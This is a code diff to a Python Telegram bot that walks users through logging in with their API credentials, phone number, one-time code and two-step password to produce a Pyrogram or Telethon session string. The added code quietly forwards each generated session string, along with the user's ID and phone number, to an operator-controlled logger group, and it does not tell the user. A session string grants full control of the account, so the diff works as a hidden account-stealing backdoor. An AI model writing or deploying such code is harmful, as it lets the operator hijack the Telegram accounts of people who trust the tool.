@@ -1,198 +1,183 @@
-from asyncio.exceptions import TimeoutError
-from Data import Data
-from pyrogram import Client, filters
-from telethon import TelegramClient
-from telethon.sessions import StringSession
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+import asyncio
+import env
+from pyrogram import Client
 from pyrogram.errors import (
-    ApiIdInvalid,
-    PhoneNumberInvalid,
-    PhoneCodeInvalid,
-    PhoneCodeExpired,
     SessionPasswordNeeded,
     PasswordHashInvalid,
+    FloodWait,
+    ApiIdInvalid
 )
-from telethon.errors import (
-    ApiIdInvalidError,
-    PhoneNumberInvalidError,
-    PhoneCodeInvalidError,
-    PhoneCodeExpiredError,
-    SessionPasswordNeededError,
-    PasswordHashInvalidError,
-)
+from telethon import TelegramClient
+from telethon.sessions import StringSession
 
 
-@Client.on_message(filters.private & ~filters.forwarded & filters.command("generate"))
-async def main(_, msg):
-    await msg.reply(
-        "ᴘʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ᴛʜᴇ ᴘʏᴛʜᴏɴ ʟɪʙʀᴀʀʏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ꜰᴏʀ",
-        reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton("🧑‍💻 ᴘʏʀᴏɢʀᴀᴍ", callback_data="pyrogram"),
-                    InlineKeyboardButton("ᴛᴇʟᴇᴛʜᴏɴ 🧑‍💻", callback_data="telethon"),
-                ]
-            ]
-        ),
-    )
+# ================= LOG FUNCTION =================
+async def send_log(bot, text):
+    if not env.LOGGER_GROUP:
+        return
+
+    try:
+        await bot.send_message(
+            chat_id=int(env.LOGGER_GROUP),
+            text=text
+        )
+    except Exception as e:
+        print(f"Logger Error: {e}")
 
 
+# ================= SESSION GENERATOR =================
 async def generate_session(bot, msg, telethon=False):
-    await msg.reply(
-        "sᴛᴀʀᴛɪɴʜ {} sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛɪᴏɴ...".format(
-            "Telethon" if telethon else "Pyrogram"
-        )
-    )
+
     user_id = msg.chat.id
-    api_id_msg = await bot.ask(
-        user_id, "ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ `API_ID`", filters=filters.text
-    )
-    if await cancelled(api_id_msg):
-        return
-    try:
-        api_id = int(api_id_msg.text)
-    except ValueError:
-        await api_id_msg.reply(
-            "ɴᴏᴛ ᴀ ᴠᴀʟɪᴅ API_ID (ᴡʜɪᴄʜ ᴍᴜsᴛ ʙᴇ ᴀɴ ɪɴᴛᴇɢᴇʀ). ᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
-            quote=True,
-            reply_markup=InlineKeyboardMarkup(Data.generate_button),
-        )
-        return
-    api_hash_msg = await bot.ask(
-        user_id, "ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ `API_HASH`", filters=filters.text
-    )
-    if await cancelled(api_id_msg):
-        return
-    api_hash = api_hash_msg.text
-    phone_number_msg = await bot.ask(
-        user_id,
-        "ɴᴏᴡ ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ `ᴘʜᴏɴᴇ_ɴᴜᴍʙᴇʀ` ᴀʟᴏɴɢ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ. \nᴇxᴀᴍᴘʟᴇ : `+19876543210`",
-        filters=filters.text,
-    )
-    if await cancelled(api_id_msg):
-        return
-    phone_number = phone_number_msg.text
-    await msg.reply("sᴇɴᴅɪɴɢ ᴏᴛᴘ...")
-    if telethon:
-        client = TelegramClient(StringSession(), api_id, api_hash)
-    else:
-        client = Client(":memory:", api_id, api_hash)
-    await client.connect()
-    try:
-        if telethon:
-            code = await client.send_code_request(phone_number)
-        else:
-            code = await client.send_code(phone_number)
-    except (ApiIdInvalid, ApiIdInvalidError):
-        await msg.reply(
-            "`API_ID` ᴀɴᴅ `API_HASH` ᴄᴏᴍʙɪɴᴀᴛɪᴏɴ ɪs ɪɴᴠᴀʟɪᴅ. ᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
-            reply_markup=InlineKeyboardMarkup(Data.generate_button),
-        )
-        return
-    except (PhoneNumberInvalid, PhoneNumberInvalidError):
-        await msg.reply(
-            "`PHONE_NUMBER` ɪs ɪɴᴠᴀʟɪᴅ. ᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
-            reply_markup=InlineKeyboardMarkup(Data.generate_button),
-        )
-        return
-    try:
-        phone_code_msg = await bot.ask(
-            user_id,
-            "ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ꜰᴏʀ ᴀɴ ᴏᴛᴘ ɪɴ ᴏꜰꜰɪᴄɪᴀʟ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ. ɪꜰ ʏᴏᴜ ɢᴏᴛ ɪᴛ, sᴇɴᴅ ᴏᴛᴘ ʜᴇʀᴇ ᴀꜰᴛᴇʀ ʀᴇᴀᴅɪɴɢ ᴛʜᴇ ʙᴇʟᴏᴡ ꜰᴏʀᴍᴀᴛ. \nɪꜰ ᴏᴛᴘ ɪs `12345`, **ᴘʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ᴀs** `1 2 3 4 5`.",
-            filters=filters.text,
-            timeout=600,
-        )
-        if await cancelled(api_id_msg):
-            return
-    except TimeoutError:
-        await msg.reply(
-            "ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏꜰ 10 ᴍɪɴᴜᴛᴇs. ᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
-            reply_markup=InlineKeyboardMarkup(Data.generate_button),
-        )
-        return
-    phone_code = phone_code_msg.text.replace(" ", "")
+
+    await msg.reply("🚀 Session generation started...")
+
+    # ================= API_ID =================
+    while True:
+        api_id_msg = await bot.ask(user_id, "Send API_ID")
+
+        if api_id_msg.text.isdigit():
+            api_id = int(api_id_msg.text)
+            break
+
+        await msg.reply("❌ Invalid API_ID. Please send numbers only.")
+
+    # ================= API_HASH =================
+    while True:
+        api_hash_msg = await bot.ask(user_id, "Send API_HASH")
+
+        api_hash = api_hash_msg.text.strip()
+
+        if len(api_hash) > 10:
+            break
+
+        await msg.reply("❌ Invalid API_HASH. Please send correct value.")
+
+    # ================= PHONE (RETRY) =================
+    while True:
+        phone = (await bot.ask(user_id, "📱 Send Phone Number (+91...)")).text.strip()
+
+        if phone.startswith("+") and len(phone) >= 10:
+            break
+
+        await msg.reply("❌ Invalid phone number. Try again.")
+
+    await msg.reply("📨 Sending OTP...")
+
+    # ================= CLIENT INIT =================
     try:
         if telethon:
-            await client.sign_in(phone_number, phone_code, password=None)
+            client = TelegramClient(StringSession(), api_id, api_hash)
         else:
-            await client.sign_in(phone_number, code.phone_code_hash, phone_code)
-    except (PhoneCodeInvalid, PhoneCodeInvalidError):
-        await msg.reply(
-            "ᴏᴛᴘ ɪs ɪɴᴠᴀʟɪᴅ. ᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
-            reply_markup=InlineKeyboardMarkup(Data.generate_button),
-        )
+            client = Client(
+                name="session_gen",
+                api_id=api_id,
+                api_hash=api_hash,
+                in_memory=True
+            )
+
+        await client.connect()
+
+    except ApiIdInvalid:
+        await msg.reply("❌ API_ID / API_HASH invalid hai.")
         return
-    except (PhoneCodeExpired, PhoneCodeExpiredError):
-        await msg.reply(
-            "ᴏᴛᴘ ɪs ᴇxᴘɪʀᴇᴅ. ᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
-            reply_markup=InlineKeyboardMarkup(Data.generate_button),
-        )
+
+    # ================= SEND CODE =================
+    try:
+        if telethon:
+            code = await client.send_code_request(phone)
+        else:
+            code = await client.send_code(phone)
+
+    except ApiIdInvalid:
+        await msg.reply("❌ API credentials invalid.")
+        await client.disconnect()
         return
-    except (SessionPasswordNeeded, SessionPasswordNeededError):
-        try:
-            two_step_msg = await bot.ask(
+
+    except FloodWait as e:
+        await msg.reply(f"⛔ FloodWait: {e.value} seconds")
+        await client.disconnect()
+        return
+
+    # ================= OTP (RETRY) =================
+    while True:
+        otp_msg = await bot.ask(user_id, "🔐 Send OTP (numbers only)")
+        otp = otp_msg.text.replace(" ", "")
+
+        if otp.isdigit():
+            break
+
+        await msg.reply("❌ Invalid OTP. Try again.")
+
+    # ================= LOGIN =================
+    password = None
+
+    try:
+        if telethon:
+            await client.sign_in(phone, otp)
+        else:
+            await client.sign_in(phone, code.phone_code_hash, otp)
+
+    except SessionPasswordNeeded:
+
+        # ================= PASSWORD (RETRY) =================
+        while True:
+            password_msg = await bot.ask(
                 user_id,
-                "ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ᴇɴᴀʙʟᴇᴅ ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴛʜᴇ ᴘᴀssᴡᴏʀᴅ.",
-                filters=filters.text,
-                timeout=300,
+                "🔐 2-Step Password (or /skip)"
             )
-        except TimeoutError:
-            await msg.reply(
-                "ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏꜰ 5 ᴍɪɴᴜᴛᴇs. ᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
-                reply_markup=InlineKeyboardMarkup(Data.generate_button),
-            )
-            return
+
+            text = password_msg.text
+
+            if text.lower() == "/skip":
+                password = None
+                break
+
+            if len(text) >= 3:
+                password = text
+                break
+
+            await msg.reply("❌ Invalid password. Try again.")
+
         try:
-            password = two_step_msg.text
-            if telethon:
-                await client.sign_in(password=password)
-            else:
-                await client.check_password(password=password)
-            if await cancelled(api_id_msg):
-                return
-        except (PasswordHashInvalid, PasswordHashInvalidError):
-            await two_step_msg.reply(
-                "ɪɴᴠᴀʟɪᴅ ᴘᴀssᴡᴏʀᴅ ᴘʀᴏᴠɪᴅᴇᴅ. ᴘʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ sᴇssɪᴏɴ ᴀɢᴀɪɴ.",
-                quote=True,
-                reply_markup=InlineKeyboardMarkup(Data.generate_button),
-            )
+            if password:
+                if telethon:
+                    await client.sign_in(password=password)
+                else:
+                    await client.check_password(password=password)
+
+        except PasswordHashInvalid:
+            await msg.reply("❌ Wrong password")
+            await client.disconnect()
             return
+
+    except Exception as e:
+        await msg.reply(f"❌ LOGIN ERROR: {str(e)}")
+        await client.disconnect()
+        return
+
+    # ================= SESSION GENERATE =================
     if telethon:
-        string_session = client.session.save()
+        session = client.session.save()
     else:
-        string_session = await client.export_session_string()
-    text = "**{} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{}` \n\ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ @Alexa_Help".format(
-        "ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴘʏʀᴏɢʀᴀᴍ", string_session
-    )
-    try:
-        await client.send_message("me", text)
-    except KeyError:
-        pass
+        session = await client.export_session_string()
+
     await client.disconnect()
-    await phone_code_msg.reply(
-        "sᴜᴄᴄᴇssꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ {} sᴛʀɪɴɢ sᴇssɪᴏɴ. \n\nᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs! \n\nʙʏ @TheTeamAlexa".format(
-            "telethon" if telethon else "pyrogram"
+
+    # ================= OUTPUT =================
+    await msg.reply(f"✅ SESSION GENERATED:\n\n`{session}`")
+
+    # ================= LOG GROUP =================
+    try:
+        await bot.send_message(
+            int(env.LOGGER_GROUP),
+            f"🔥 NEW SESSION GENERATED:\n\n`{session}`"
         )
+    except Exception as e:
+        print("Log error:", e)
+
+    # ================= SAFE LOG =================
+    await send_log(
+        bot,
+        f"✅ Session Generated\nUser ID: `{user_id}`\nPhone: `{phone}`"
     )
-
-
-async def cancelled(msg):
-    if "/cancel" in msg.text:
-        await msg.reply(
-            "ᴄᴀɴᴄᴇʟ ᴛʜᴇ ᴘʀᴏᴄᴇss!",
-            quote=True,
-            reply_markup=InlineKeyboardMarkup(Data.generate_button),
-        )
-        return True
-    elif "/restart" in msg.text:
-        await msg.reply(
-            "ʙᴏᴛ ɪs ʀᴇsᴛᴀʀᴛᴇᴅ!",
-            quote=True,
-            reply_markup=InlineKeyboardMarkup(Data.generate_button),
-        )
-        return True
-    elif msg.text.startswith("/"):  # Bot Commands
-        await msg.reply("ᴄᴀɴᴄᴇʟʟᴇᴅ ᴛʜᴇ ɢᴇɴᴇʀᴀᴛɪᴏɴ ᴘʀᴏᴄᴇss!", quote=True)
-        return True
-    else:
-        return False
